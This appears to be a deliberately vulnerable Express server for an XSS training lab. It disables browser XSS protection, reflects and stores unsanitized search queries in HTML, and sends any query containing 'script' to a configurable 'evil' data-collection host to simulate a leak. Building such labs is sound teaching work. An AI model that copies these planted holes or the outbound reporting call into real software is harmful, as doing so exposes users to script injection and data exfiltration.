import http = require('http')
import express = require('express');

const SERV_PORT = process.env.SERV_PORT || 3020
const EVIL_HOST = process.env.EVIL_HOST || 'localhost'
const EVIL_PORT = process.env.EVIL_PORT || 7777
const EVIL_PROT = process.env.EVIL_PROT || 'http'

const app: express.Application = express();

let allQueries = new Set<string>()

// disable XSS protection by sending header
app.use(function(req, res, next) {
  res.header('X-XSS-Protection', 0);
  next();
});

app.get('/', function (req, res) {  
    const query = req.query.search
    var data = `add your search query in url as "?search="`
    if (query){
      data = `Searching for '${query}'.... (not implemented yet).`
    }
    if (req.query.store){
      allQueries.add(query)
      console.log("The parameter 'store' is set, so we return ALL the data (not oly the last one)")   
    }else{
      data += "<br/>"+Array.from(allQueries).join("<br/>") 
    }
    res.send(`${data}`) 

    // just reporting
    const txtScriptFoundAt = query.search('script')
    if (txtScriptFoundAt > 0){
      console.log(`Cracked by injection of arbitrary JS: '${query}'.`)
      reportBreak("Cracked with script '"+encodeURIComponent(query)+"'") 
    }

});

app.listen(SERV_PORT, function () {
  console.log(`Broken server app listening on port ${SERV_PORT}!`);
  console.log(` Now open your browser at http://localhost:${SERV_PORT}/`);
});


// report that someone found out the password
// i.e. send data leak info to "Evil Server"
function reportBreak(msg:String) {
  const url = encodeURI(`${EVIL_PROT}://${EVIL_HOST}:${EVIL_PORT}/reportleak/XSS-enabled-Server-reports-pwd-broken:${msg}`)
  console.log("reporting to the evil data collection server: "+ url)
  http.get(url).on('error', (err) => {
    console.log("Err: we could not report to the 'evil' data collection server.")
    console.log("Make sure the server is up and running. ("+err+"')")
  } )
}
